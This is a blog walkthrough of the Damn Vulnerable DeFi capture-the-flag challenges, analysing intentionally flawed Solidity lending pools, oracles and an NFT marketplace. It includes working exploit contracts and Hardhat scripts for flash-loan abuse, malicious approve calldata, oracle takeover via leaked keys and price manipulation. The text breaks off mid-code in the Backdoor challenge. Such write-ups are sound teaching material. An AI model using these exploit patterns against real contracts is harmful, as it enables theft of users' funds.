# Damn Vulnerable DeFi
In this post, we are going to review the Damn Vulnerable DeFi challenges one by one. We are going to analyze the contracts and explore and hack their vulnerabilities.

On [damnvulnerabledefi](https://www.damnvulnerabledefi.xyz/) page you can check the instructions for getting started. Let's go!

## Preliminares
### Tools and Environment
**IDE: Visual Studio Code + Solidity Visual Auditor**

We are going to use Visual Studio Code for taking advantage of one particular VSC extension: the [Solidity Visual Auditor](https://marketplace.visualstudio.com/items?itemName=tintinweb.solidity-visual-auditor), developed by Consensys Diligence.

This extension will assist us during the challenges, by providing code insights, syntax and semantic highlighting, and visual graphs which represent contracts and interactions.

We can also generate visual graphs by utilizing Surya capabilities, embedded in the pluggin. We'll do this for every challenge, so we get a clear overview on the contracts we are hacking and the calls between them.

**Hardhat**

The development environment we'll use is [Hardhat](https://hardhat.org/). It provides us with a rich testing environment which we'll be using for our hacks. It uses [Ethers.js](https://docs.ethers.io/v5/) library for smart contract interaction.

Using console logs in your contracts for debugging:
```
import "hardhat/console.sol";
(...)
console.log("fdrsw");
```

**Codebase**

We'll have to clone the repository, checkout the latest version and install the dependencies:
```
git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git
cd damn-vulnerable-defi
git checkout v2.2.0
yarn
```
There is one folder called `contracts` where we can find all the challenges, each on a separate folder. We'll also find 3 contracts without a specific folder, which are utilized along the different challenges. These are:
- `DamnValuableNFT.sol`
- `DamnValuableToken.sol`
- `DamnValuableTokenSnapshot.sol`

The other relevant folder is called `test`. Inside we'll find again separate folders for each challenge. Here in the `js` files is where we'll code the solutions and we'll verify them by running the command:

```
yarn run *challenge-name*
```

This command essentially uses the hardhat command for running tests:
```
yarn hardhat test test/*challenge-folder*/*challenge-file*
```

### Setup
For completing the challenges we'll just need to open the challenge scripts on the test folder and include our hack. For validating we simply need to call the script and, voilà!

1. Open a terminal inside the project folder

2. Run the first challenge script
```
yarn run unstoppable
```

Now you'll see that the script will fail - as we haven't yet started to work on the challenge.

## Challenge #1: Unstoppable
### The Goal
The Unstoppable challenge states the following:
> There's a lending pool with a million DVT tokens in balance, offering flash loans for free. If only there was a way to attack and stop the pool from offering flash loans... You start with 100 DVT tokens in balance.

Our goal is to break the Flash Loan functionality from the pool, so it is no longer possible to perform another Flash Loan. Let's start by analizing the `flashLoan`function, to see what we get from there.

### Contract Call Graphs
There are 2 contracts:
- UnstoppableLender.sol
- UnstoppableReceiver.sol

The contract diagrams generated with the Solidity Visual Auditor extension are the following:

<figure style="display:inline-block; text-align:center">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/unstoppable-lender.png" alt="Unstoppable Lender" width="350"/>
    <figcaption>Unstoppable Lender</figcaption>
</figure>
<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/unstoppable-receiver.png" title="Unstoppable Receiver" width="350"/>
    <figcaption>Unstoppable Receiver</figcaption>
</figure>

### Required Knowledge
- [A basic understand of what are flashloans and how do they work](https://docs.aave.com/developers/guides/flash-loans)

### Contracts Highlights
On the `flashLoan(uint256 borrowAmount)` function we can see that it is required that the `poolBalance` equals the `balanceBefore` value. However, where do these values come from?

```
 assert(poolBalance == balanceBefore);
```

A couple of lines above, we can see that the `balanceBefore` value is taken using the `balanceOf` function from the token contract.

```
uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
```

On the other hand, the `poolBalance` value is a contract variable updated every time we call the `depositTokens(uint256 amount)` function.

Does this ring a bell?


### The Hack
As you might be realizing, there is a way in which we can make the assertion of balances `false`, which is, sending some tokens to the pool directly by using the token function `transfer` instead of `depositTokens`.

If we do this, the assertion won't be no longer true, and it won't be possible to execute any other flashloans, as the variable `poolBalance` won't be updated.

So the exploit looks like this. On the `test/unstoppable/unstoppable.challange.js`, include the following code, which performs a transfer to the pool address
```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const poolAddr = await this.pool.address
    await this.token.transfer(poolAddr,1) 
});
```
Now, run the script with `yarn run unstoppable` and see how we pass the challenge.

## Challenge #2: Naive Receiver
### The Goal
The Naive Receiver challenge states the following:
> There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance. (...) A user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH. 

Our goal is to hack the user's contract and drain all the funds. If we can do it with a single transaction is a bonus.

### Contract Call Graphs
There are 2 contracts:
- NaiveReceiverLenderPool.sol
- FlashLoanReceiver.sol

The contract diagrams generated with the Solidity Visual Auditor extension are the following:

<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/naive-receiver.png" alt="Naive Receiver Lender Pool" width="350"/>
    <figcaption>Naive Receiver Lender Pool</figcaption>
</figure>
<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/flashloan-receiver.png" title="FlashLoan Receiver" width="350"/>
    <figcaption>FlashLoan Receiver</figcaption>
</figure>

### Required Knowledge
- For the bonus: [Smart Contract Interfaces](https://cryptomarketpool.com/interface-in-solidity-smart-contracts/)

### Contracts Highlights
The flashLoan function accepts 2 arguments, the borrower address and the borrowerAmount. 
`function flashLoan(address borrower, uint256 borrowAmount)`.
This means that we can "impersonate" the borrower, by passing its contract address.

### The Hack
We are going to impersonate the FlashLoanReceiver contract, by passing its address to the `flashLoan` function, like this:
`await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('1'))`

We can perform this action 10 times and this will drain all the funds (10ETH).

There is a bonus for performing this in a single transaction. For that, we can setup a simple smart contract, that executes the 10x calls above.

```
// Interface for interacting with the Naive Receiver Lender Pool
interface INaiveReceiverLenderPool {
     function flashLoan(address borrower, uint256 borrowAmount) external;
     function fixedFee() external pure returns (uint256);
}

// Exploit Contract
contract NaiveReceiverExploit {
    function hack(
        INaiveReceiverLenderPool pool,
        address payable receiver
    ) public {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}
```

On the test code, we'll deploy our exploit contract and execute the hack.

```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    // Hack with a single transaction using a Smart Contract
    const ExploitFactory = await ethers.getContractFactory('NaiveReceiverExploit', deployer);
    this.exploit = await ExploitFactory.deploy();
    await this.exploit.hack(this.pool.address, this.receiver.address)

    // Hack with 10 transactions
    /*
    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
    .
    .
    .
    x10
    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
    */

    });
```

## Challenge #3: Truster
### The Goal
The Truster challenge states the following:
> A new pool has launched that is offering flash loans of DVT tokens for free. The pool has 1 million DVT tokens in balance. And you have nothing. Take all of them from the pool. In a single transaction.

### Contract Call Graphs
There is only 1 simple contract:
- TrusterLenderPool.sol

The contract diagram generated with the Solidity Visual Auditor extension are the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/truster-lender-pool.png" title="Truster Lender Pool" width="350"/>
    <figcaption>Truster Lender Pool</figcaption>
</figure>


### Required Knowledge
- [ERC20 token specification](https://eips.ethereum.org/EIPS/eip-20)
- [External calls](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#use-caution-when-making-external-calls)

https://ethereum.stackexchange.com/questions/52989/what-is-calldata


### Contracts Highlights
This allows us to call any contract function on the flash loan contract’s behalf which can be exploited. First, we take a flash loan of 0 tokens (such that no repayment is required) and pass the token’s approve function as arguments with a payload that approves our attacker to withdraw all funds in a subsequent transaction. This works because the context under which approve is executed is the flash loan contract because it is the one calling it.

### The Hack
For the function call, what it happens is the following:

1. Hacker calls hack function from TrusterExploit
2. TrusterExploit calls `flashLoan` function from TrusterLenderPool
3. TrusterLenderPool executes an external call to the TrusterExploit contract with data
4. This data turns out to approve all its balance to the attacker's address

We will create a contract where we call the `flashLoan` function from the pool, and we will make use of the functionCall for approving.

```
// Interface for interacting with the Truster Lender Pool
interface ITrusterLenderPool {
     function flashLoan(
        uint256 borrowAmount, 
        address borrower, 
        address target, 
        bytes calldata data
        ) external;
}

// Exploit Contract
contract TrusterExploit {
    function hack(
        IERC20 token,
        ITrusterLenderPool pool,
        address payable hacker
    ) public {
        uint256 poolBalance = token.balanceOf((address(pool)));
        bytes memory approveCalldata = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
            );
        pool.flashLoan(0, hacker, address(token), approveCalldata);
        token.transferFrom(address(pool), hacker, poolBalance);
    }
}
```

## Challenge #4: Side Entrance
### The Goal
The Side Entrance challenge states the following:
> A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time. This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Our goal is to take all ETH from the lending pool.

### Contract Call Graphs
There is only 1 simple contract:
- SideEntranceLenderPool.sol

The contract diagram generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/side-entrance.png" title="Side Entrance Lender Pool" width="350"/>
    <figcaption>Side Entrance Lender Pool</figcaption>
</figure>

### Required Knowledge
- [Mapping in Solidity](https://www.alchemy.com/overviews/solidity-mapping)
- [Smart Contract receiving ETH. Split between `receive` and `fallback` into separate functions](https://blog.soliditylang.org/2020/03/26/fallback-receive-split/).

### Contracts Highlights
We have 3 functions, for depositing, withdrawing and performing a flashLoan. The contract keeps track of the balances of each user with the mapping `balances`.

Analyzing the `flashLoan` function we can see that it requires that the pool balance is greater or equal than before performing the flashloan.


We can see that it does not check who are holding these balances though...

### The Hack
We can perfom a flashloan with all the pool balance and utilize the execute function for deposit all the amount into the pool again.
This effectively means that we don't have to return the flashloan, as the require statement just checks that the balance of the pool is greater or equal than the previous balance. This condition will hold, as the pool balance would be the same before the flashloan, the only difference is that now, the balances mapping has changed, and all the pool balance is mapped to our address.

The final step is simply to use the withdraw function for taking all the ETH from the pool.

You can see how balances change on each step in the following table.

| Action      | Pool Balance | Attacker Balance | balances[Attacker] |
| ----------- | ----------- | ----------- | ----------- |
| Initial state  | 1000       | 0 | 0
| flashLoan(ETHER_IN_POOL)   | 0        | 1000 | 0 |
| deposit(){value: ETHER_IN_POOL}   | 1000        | 0 | 1000 |
| withdraw()   | 0        | 1000 | 0 |

The implementation in Solidity would be:
```
// Interface for interacting with the Side Entrance Lender Pool
interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

// Exploit contract
contract SideEntranceExploit {
    using Address for address payable;
    address poolAddr;
    address hackerAddr;
    ISideEntranceLenderPool pool;

    constructor (ISideEntranceLenderPool _pool) {
        hackerAddr = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function flash(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(hackerAddr).sendValue(amount);
    }

    receive() external payable {}

}
```
Few highlights:
- On the function `constructor()`, we'll be initializing the pool interface with its address, as well as grab our attacker address, for being able to pay us back, once we've drained the pool.
- The function `execute()` is needed as it is defined in the pool contract as the interface on how to talk to external contracts (like ours). Here we perform the `deposit`action with the flashLoan amount that we have been granted, so the pool balance is the same as before performing the flashloan.
- The function `flash()`is the one the attacker will call for initiate the attack. It will call the `flashLoan`function from the pool, and once done, it will withdraw the funds and send them to the attacker address.
- The `receive() external payable` will allow our contract to receive ETH, needed when called the `withdraw`() function.

On the test code, we'll then deploy our malicious contract and call the `flash()` function.
```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const SideEntranceExploit = await ethers.getContractFactory('SideEntranceExploit', attacker);
    this.exploit = await SideEntranceExploit.deploy(this.pool.address);
    await this.exploit.flash(ETHER_IN_POOL);
    });
```


## Challenge #5: The Rewarder
### The Goal
The Rewarder challenge states the following:
> There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don't have any DVT tokens. Rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

Our goal is to claim most rewards for yourself.

### Contract Call Graphs
There are 4 contracts:
- AccountingToken.sol
- FlashLoanerPool.sol
- RewardToken.sol
- TheRewarderPool.sol

The contract diagram for the Rewarder Pool generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/rewarder-pool.png" title="Rewarder Pool" width="750"/>
    <figcaption>Rewarder Pool</figcaption>
</figure>

### Required Knowledge
- [ERC20Snapshot](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot)
- [Access control and Role setup](https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl-_setupRole-bytes32-address-)

### Contracts Highlights

### The Hack
Make a flash loan to get some DVT tokens.
Approve and deposit the tokens to the rewarder pool. This will immediately call the snapshot function and send rewards.
Previously we have to advance the hardhat vlokchain for 5 days.


## Challenge #6: Selfie
### The Goal
The Rewarder challenge states the following:
> A new cool lending pool has launched! It's now offering flash loans of DVT tokens. Wow, and it even includes a really fancy governance mechanism to control it.
You start with no DVT tokens in balance, and the pool has 1.5 million.

Our goal is to take all DVT tokens.

### Contract Call Graphs
There are 2 contracts:
- SelfiePool.sol
- SimpleGovernance.sol

The contract diagram for the Selfie Pool generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/selfie-pool.png" title="Selfie Pool" width="350"/>
    <figcaption>Selfie Pool</figcaption>
</figure>


### Required Knowledge
- [Encode with signature](https://ethereum.stackexchange.com/questions/91826/why-are-there-two-methods-encoding-arguments-abi-encode-and-abi-encodepacked)
- [Snapshot](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot)
- [EVM increase time](https://ethereum.stackexchange.com/questions/86633/time-dependent-tests-with-hardhat)

### Contracts Highlights
- SelfiePool provides a function for executing flash loans. We could use this function to get tokens.

- SelfiePool has a method for draining all its funds. It uses a modifier which enforces that only the Governance token can call this function. It seems that this is the function we need for getting all the tokens from the contract. This means we would need to hack the Governance contract in order to call this function.

- SimpleGovernance allows to execute actions, which can call other contract functions. It seems that this is precisely what we need for calling the `drainAllFunds` function from the SelfiePool.


### The Hack
We need to queue the action with the malicious payload in order to call the `drainAllFunds` function. The only requirement is to have enough tokens - which we'll do, when we perform the flashLoan. The attack sequence is the following:

1. Get tokens from the pool, using the flashLoan function
2. Queue our action for draining all the funds, from the governance contract. This will be possible as we'll have enough tokens in our balance.
3. Once the action has been queued, we can return the flashLoan.
4. Now we can increase the evm time, to make sure we can execute the action, satisfying the delay required by the executeAction function
5. Finally we can call the `executeAction` function, which will drain all the pool funds.


## Challenge #7: Compromised
### The Goal
The Compromised challenge states the following:
> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

> A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each. 
This price is fetched from an on-chain oracle, and is based on three trusted reporters: 
- `0xA73209FB1a42495120166736362A1DfA9F95A105`
- `0xe92401A4d3af5E446d93D11EEc806b1462b39D15`
- `0x81A5D6E50C214044bE44cA0CB057fe119097850c`

Our goal is to steal all ETH available in the exchange, starting with 0.1 ETH.

### Contract Call Graphs
There are 3 contracts:
- Exchange.sol
- TrustfulOracle.sol
- TrustfulOracleInitializer.sol

The contract diagram for the Exchange and TrustfulOracle generated with the Solidity Visual Auditor extension are the following:

<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/trustful-oracle.png" title="TrustfulOracle" width="250"/>
    <figcaption>Trustful Oracle</figcaption>
</figure>

<figure style="display:inline-block; text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/exchange.png" title="Exchange" width="350"/>
    <figcaption>Exchange</figcaption>
</figure>

### Required Knowledge
- [Attach method from ethers.js](https://stackoverflow.com/questions/72820081/what-does-the-attach-method-do-in-ethers-js)
- [Testing from different accounts](https://hardhat.org/hardhat-runner/docs/other-guides/waffle-testing#testing-from-a-different-account)
- [Buffers and Encoding](https://nodejs.org/docs/latest/api/buffer.html#buffer_buffer)
- [Ethers Wallet](https://docs.ethers.io/v5/api/signer/#Wallet)

### Contracts Highlights
We have an exchange where we can buy and sell NFTs at the price that the oracle estipulated. There's not much we can do at the Exchange contract, so let's look at the TrustfulOracle contract.
Here we see the logic for setting up prices. Basically the sources can post prices for the NFTs and prices are then calculated as the median from all the sources prices.
If only we could get the majority of the sources under our control, we could change the price of the NFTs to our convenience.

### The Hack
First of all, we are going to work with the data provided on the HTTP response. We notice that data is encoded as a Buffer. So let's try to convert it to string:

Buffer to string
- `MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5`

- `MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4`

From the strings we get, we can suspect that is a base64 encoded string, as it fulfils the following conditions:
- The length of a Base64-encoded string is always a multiple of 4
- Only these characters are used by the encryption: “A” to “Z”, “a” to “z”, “0” to “9”, “+” and “/”
- The end of a string can be padded up to two times using the “=”-character (this character is allowed in the end only)

Decode from base64 string
- `0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9`
- `0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48`

The strings we've obtained look very much like private keys, as they are 64 hex chars, so we can derive the public keys from the private keys, to check to which addresses correspond..

To our surprise, the addresses are 2 of the oracle sources!

Now that we have the private keys of 2/3 of the oracle, we can create two wallet instances with the private keys and modify the NFT prices in our convenience.

1. Lower the price of the NFT using the 2 oracle sources accounts:
- `await this.oracle.connect(source1).postPrice("DVNFT", '0');`
- `await this.oracle.connect(source2).postPrice("DVNFT", '0');`

2. Buy the NFT at low price
- `await this.exchange.connect(attacker).buyOne({value: "1"});`

3. Raise the price of the NFT using the 2 oracle sources acccounts
- `await this.oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);`
- `await this.oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);`

4. Sell the NFT at high price
- `await this.nftToken.connect(attacker).approve(this.exchange.address, 0);`
- `await this.exchange.connect(attacker).sellOne(0);`

5. Restore the price of the NFT back to the initial price
- `await this.oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);`
- `await this.oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);`

## Challenge #8: Puppet
### The Goal
The Puppet challenge states the following:
> There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Our goal is to steal all the tokens from the lending pool, starting with 25ETH and 1000 DVTs in balance.

### Contract Call Graphs
There is 1 contract and 2 abis:
- PuppetPool.sol
- UniswapV1Factory.json
- UniswapV1Exchange.json

The contract diagram for the Puppet Pool generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/puppet.png" title="PuppetPool" width="500"/>
    <figcaption>Puppet Pool</figcaption>
</figure>

### Required Knowledge
- [How DEX's work? Understanding Uniswap V1](https://dev.to/learnweb3/how-do-dexs-work-understand-uniswap-v1-by-deep-diving-into-the-math-and-code-learn-the-xyk-amm-curve-46hb)

### Contracts Highlights
The Puupet Pool allows us to borrow tokens, by depositing a collateral of ETH, whose amount doubles the borrow amount.

We can see that for computing the price of the token, it uses the follwing formula:

```
 function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

We can quickly realise that if we make the denominator greater than the numerator, we would obtain a price of 0, which would in turn, make that the deposit required as collateral be 0, and allow us to borrow all the tokens, with few collateral.

```
  function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * 2 / 10 ** 18;
}
```

### The Hack
We can use the `tokenToEthSwapInput` to send some tokens to the DEX and receive ETH in return, making the ETH balance in the pool smaller.
Then we can call the `borrow` function for getting all the tokens of the pool with few collateral.

## Challenge #9: Puppet v2
### The Goal
The Puppet v2 challenge states the following:
> The developers of the last lending pool are saying that they've learned the lesson. And just released a new version! Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.

Our goal is to steal all the tokens from the lending pool, starting with 20ETH and 10000 DVTs in balance.

### Contract Call Graphs
There is 1 contract and UniswapV2 library:
- PuppetV2Pool.sol
- UniswapV2Library.sol

The contract diagram for the Puppet V2 Pool generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/puppetv2.png" title="PuppetV2Pool" width="700"/>
    <figcaption>Puppet V2 Pool</figcaption>
</figure>

### Required Knowledge
- [Uniswap V2](https://medium.com/@chiqing/uniswap-v2-explained-beginner-friendly-b5d2cb64fe0f#:~:text=Uniswap%20V2%20allows%20traders%20to,is%20called%20%E2%80%9CLiquidity%20Pool%E2%80%9D.)

### Contracts Highlights
In the lending pool contract we see 3 functions:
- **borrow(borrowAmount)**: here we can borrow any quantity of DVT tokens as long as there is enough liquidity in the pool and we deposit the required WETH amount as collateral. For calculating the collateral required the contract uses the function below.
- **calculateDepositOfWETH(tokenAmount)**: here we simply get the quote from the function below and multiply it by 3, as the contract requires that we deposit 3 times the amount in WETH.
- **_getOracleQuote(amount)**: here we call the `quote` function from Uniswap library. 

In the same way as in the previous challenge, we can observe the formula for getting the quote is:
```
        amountTokenA * reserveTokenB       DVTTokenAmount * WETHReserve
quote = ------------------------------ =  --------------------------------
             reserveTokenA                           DVTReserve
```


### The Hack
The idea is to manipulate the price of the quote, so we can borrow all DVT tokens at discount. For doing so, if we make the denominator greater, we can decrease the quote that the pool contract will receive.

1. We approve the DVT tokens to the Uniswap Router contract
```
await this.token.connect(attacker).approve(
    this.uniswapRouter.address,
    ATTACKER_INITIAL_TOKEN_BALANCE
);
```

2. We swap DVT for ETH to increase the DVT token reserve. This will make the denominater greater than the numerator, resulting in decreasing the quote price
```
await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
    ATTACKER_INITIAL_TOKEN_BALANCE, //amountIn
    0, //amountOutMin
    [this.token.address, this.weth.address], //addresses
    attacker.address, //to
    (await ethers.provider.getBlock('latest')).timestamp *2, //deadline
);
```

3. Now we can calculate the amount of WETH needed as collateral in order to get all DVT tokens from the lending pool
```
const collateral = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
```

4. We can proceed to wrap ETH to WETH and obtain the required collateral
```
 Wrap WETH
await this.weth.connect(attacker).deposit({
    value: collateral
});
```

5. Now we approve the amount of WETH to the pool, so it can trasnfer our collateral for performing the borrow successfully
```
await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
```
6. Finally, we get all DVT tokens using the borrow function from the pool
```
await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
```

## Challenge #10: Free Rider
### The Goal
The Free Rider challenge states the following:
> A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH. A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way. Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.

Our goal is to steal all the tokens.

### Contract Call Graphs
There are 2 contracts :
- FreeRiderNFTMarketplace.sol
- FreeRiderBuyer.sol

The contract diagram for theFreRiderNFTMarketpalce generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/free-rider-marketplace.png" title="FreeRider" width="350"/>
    <figcaption>Free Rider Marketplace</figcaption>
</figure>

### Required Knowledge
- [EIP721](https://eips.ethereum.org/EIPS/eip-721)
- [Uniswap V2. Flash Swaps](https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps)
- [Flash Swap Example](https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol)
- [Function Selector](https://ethereum.stackexchange.com/questions/72687/explanation-of-appending-selector-in-solidity-smart-contracts)

### Contracts Highlights
On the `_buyOne` function we can see that it checks the `msg.value` is greater than the price for that specific token.

There is a problem with this peice of code, as the `msg.value` will be always the same. This means that we can buy 6 NFTs for the price of 1.

```
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; i++) {
        _buyOne(tokenIds[i]);
    }
    }

function _buyOne(uint256 tokenId) private {       
    uint256 priceToPay = offers[tokenId];
    console.log("value", msg.value);
    require(msg.value >= priceToPay, "Amount paid is not enough");

```
After running the function for buying 5 NFTs with the price of 15ETH with a `console.log` we can see that the `msg.value` is always the same and we succeed to buy 5 for the price of 1.

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/free-rider-amount.png" title="FreeRider" width="350"/>
    <figcaption>Free Rider Amount</figcaption>
</figure>


Another vulnerability in the marketplace contract will cause that all the 90ETH is drained and payed to our attacker function, meaning that the final result would be to receive the 45ETH from the reward plus the 90ETH from the marketplace contract. Let's look at this code inside the function `_buyOne`:

```
// transfer from seller to buyer
token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller
console.log("owner", token.ownerOf(tokenId));
payable(token.ownerOf(tokenId)).sendValue(priceToPay);
```

As you can see, when we buy one NFT, this is **first** transferred and **after**, the contract pays from its own balance the price of the token to the token owner, which is already the new owner! This means that every time we buy one NFT, we will be payed 15ETH from the marketplace balance.

### The Hack
We need to get 15 ETH from Uniswap pool, so then we can buy all 5 NFTs for the price of 1.
For doing so, we need to take advantage of the flash Swap functionality of Uniswap and pay it back with the amount we receive from the reward from the FreeRiderBuyer contract.
The process is the following:

1. Use the Flash Swap function to get 15WETH
2. Unwrap the WETH to get ETH
3. Call the `buyMany`function to buy all the NFTs with a value of 15ETH (that's all we need). In parallel, we will receive 15ETH each time, from the market funds.
4. Wrap ETH back to WETH and return the flash swap + fees
5. Send the NFTs to the buyer, to receive the extra reward of 45ETH


## Challenge #11: Backdoor
### The Goal
The Backdoor challenge states the following:
> To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens. To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks. Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.

Our goal is to take all funds from the registry. In a single transaction.

### Contract Call Graphs
There is one contract:
- WalletRegistry.sol

The contract diagram for WalletRegistry generated with the Solidity Visual Auditor extension is the following:

<figure style="text-align:center;">
    <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/backdoor.png" title="WalletRegistry" width="350"/>
    <figcaption>Wallet Registry</figcaption>
</figure>

### Required Knowledge
- [Gnosis Safe](https://docs.gnosis-safe.io/)
- [Backdooring Gnosis Safe Multisig wallets](https://blog.openzeppelin.com/backdooring-gnosis-safe-multisig-wallets/)

### Contracts Highlights
On the `proxyCreated` function we can see that after different requirements, the tokens are sent to the `walletAddress`: `token.transfer(walletAddress, TOKEN_PAYMENT);`.
Let's figure out what's the `walletAddress`. Several lines above we can see that it refers to `address payable walletAddress = payable(proxy);`. That is an instance of the `GnosisSafeProxy`.
Is there a way to make the proxy address point to our contract?
Let's continue by investigating the instance. The function `createProxyWithCallback` in the `GnosisSafeProxyFactory.sol` does the following:
```    
/// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction
    /// @param _singleton Address of singleton contract.
    /// @param initializer Payload for message call sent to new proxy contract.
    /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
    /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized.
    function createProxyWithCallback(
        address _singleton,
